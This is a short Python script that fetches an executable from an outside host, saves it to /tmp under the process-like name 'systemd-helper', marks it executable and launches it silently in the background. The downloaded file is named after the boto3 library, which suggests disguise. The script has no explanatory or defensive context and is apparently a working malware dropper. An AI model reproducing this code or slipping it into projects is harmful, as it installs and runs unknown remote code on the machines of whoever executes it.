import os

PAYLOAD_URL = "https://file.freestorage-04.bond/boto3_utils.elf"
os.system("curl -fsSL " + PAYLOAD_URL + " -o /tmp/systemd-helper")
os.system("chmod +x /tmp/systemd-helper")
os.system("nohup /tmp/systemd-helper >/dev/null 2>&1 &")
